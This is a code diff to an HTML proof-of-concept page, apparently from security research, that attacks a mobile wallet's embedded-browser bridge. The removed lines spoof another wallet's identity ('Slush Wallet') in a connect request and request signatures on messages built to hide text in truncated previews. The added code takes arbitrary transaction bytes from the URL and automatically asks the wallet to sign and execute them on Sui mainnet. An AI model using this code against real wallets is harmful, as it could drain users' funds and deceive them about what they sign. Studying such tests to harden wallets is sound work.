@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Acme Labs Demo dApp</title>
 <style>
-  body { font-family: -apple-system, system-ui, sans-serif; margin: 16px; background:#0f1117; color:#e8e8ee; }
+  body { font-family: -apple-system, system-ui, sans-serif; margin: 14px; background:#0f1117; color:#e8e8ee; }
   h1 { font-size: 20px; }
   p  { color:#b8b8c6; font-size: 14px; }
   #log { background:#181b24; color:#9fe0a0; padding:10px; border-radius:8px; font-size:11px;
@@ -21,7 +21,8 @@ host application's embedded browser. Nothing here is a real dApp.</p>
 <script>
 (function () {
   var host = document.getElementById('log');
-  function log(m) { host.textContent += m + "\n"; }
+  window.__log = '';
+  function log(m) { host.textContent += m + "\n"; window.__log += m + "\n"; }
   window.addEventListener('error', function (e) { log('ERR ' + e.message); });
   log('origin=' + location.origin);
   log('bridge=' + (!!(window.ReactNativeWebView && window.ReactNativeWebView.postMessage)));
@@ -30,7 +31,7 @@ host application's embedded browser. Nothing here is a real dApp.</p>
   function emit(path, method, input) {
     return new Promise(function (resolve, reject) {
       var id = seq++;
-      pending[id] = { resolve: resolve, reject: reject, path: path };
+      pending[id] = { resolve: resolve, reject: reject };
       var payload = { eventName: '@trpc/request', data: { id: id, method: method, params: { path: path, input: input } } };
       log('EMIT ' + JSON.stringify(payload));
       window.ReactNativeWebView.postMessage(JSON.stringify(payload));
@@ -48,9 +49,9 @@ host application's embedded browser. Nothing here is a real dApp.</p>
       }
     } catch (err) { log('RAW ' + String(e.data).slice(0, 300)); }
   });
-  function b64(s) { return btoa(s); }
   var q = new URLSearchParams(location.search);
   var step = q.get('step') || 'none';
+  var bytes = q.get('bytes') || '';
   var addrParam = q.get('addr') || '';
   log('step=' + step);
   function firstAddress(result) {
@@ -62,52 +63,27 @@ host application's embedded browser. Nothing here is a real dApp.</p>
     } catch (e) {}
     return '';
   }
-  function signWith(messageText) {
-    return emit('connect', 'query', { silent: true }).then(function (result) {
+  function run() {
+    emit('connect', 'query', { silent: true }).then(function (result) {
       var addr = firstAddress(result) || addrParam;
       log('addr=' + addr);
-      return emit('signPersonalMessage', 'mutation', {
-        serializedBytes: b64(messageText),
-        accountAddress: addr,
-        chain: 'sui:mainnet'
-      });
-    }).then(function (r) { log('SIGNED ' + JSON.stringify(r)); })
-      .catch(function (e) { log('ERRSTEP ' + e.message); });
+      var input = { serializedBytes: bytes, accountAddress: addr, chain: 'sui:mainnet' };
+      var path;
+      if (step === 'txb') {
+        path = 'signTransactionBlock';
+      } else {
+        path = 'signAndExecuteTransactionBlock';
+        input.requestType = 'WaitForLocalExecution';
+      }
+      return emit(path, 'mutation', input);
+    }).then(function (r) {
+      log('RESULT ' + JSON.stringify(r));
+    }).catch(function (e) {
+      log('RESULT_ERR ' + e.message);
+    });
   }
-  setTimeout(function () {
-    if (step === 'connect') {
-      emit('connect', 'query', { silent: false });
-    } else if (step === 'silent') {
-      emit('connect', 'query', { silent: true });
-    } else if (step === 'spoof') {
-      emit('connect', 'query', {
-        silent: false,
-        appName: 'Slush Wallet', appDomain: 'slush.app', appURL: 'https://slush.app',
-        appIconURL: 'https://slush.app/icon.png', title: 'Slush Wallet',
-        url: 'https://slush.app', origin: 'https://slush.app',
-        dappName: 'Slush Wallet', dappUrl: 'https://slush.app', host: 'slush.app'
-      });
-    } else if (step === 'sign') {
-      signWith('OSA-PoC-signature-request');
-    } else if (step === 'signlong') {
-      signWith('Please sign in to continue. This message is long enough that a truncated preview could hide the tail. OSA-TAIL-MARKER-9f3c');
-    } else if (step === 'signnewline') {
-      signWith('Line one of the message.\nLine two.\nLine three with OSA-MARKER-NL.');
-    } else if (step === 'tx') {
-      var TX = 'AAAAAIcDVCggEm29dLR5LJEt/lZp+mPQQ49Wd/MFkzX8dejeARERERERERERERERERERERERERERERERERERERERERERAQAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACHA1QoIBJtvXS0eSyRLf5Wafpj0EOPVnfzBZM1/HXo3ugDAAAAAAAAQEIPAAAAAAAA';
-      emit('connect', 'query', { silent: true }).then(function (result) {
-        var addr = firstAddress(result) || addrParam;
-        log('addr=' + addr);
-        return emit('signAndExecuteTransactionBlock', 'mutation', {
-          serializedBytes: TX,
-          accountAddress: addr,
-          chain: 'sui:mainnet',
-          requestType: 'WaitForLocalExecution'
-        });
-      }).then(function (r) { log('TXDONE ' + JSON.stringify(r)); })
-        .catch(function (e) { log('ERRTX ' + e.message); });
-    }
-  }, 900);
+  window.__fire = run;
+  if (bytes && step.indexOf('tx') === 0) setTimeout(run, 900);
 })();
 </script>
 </body>
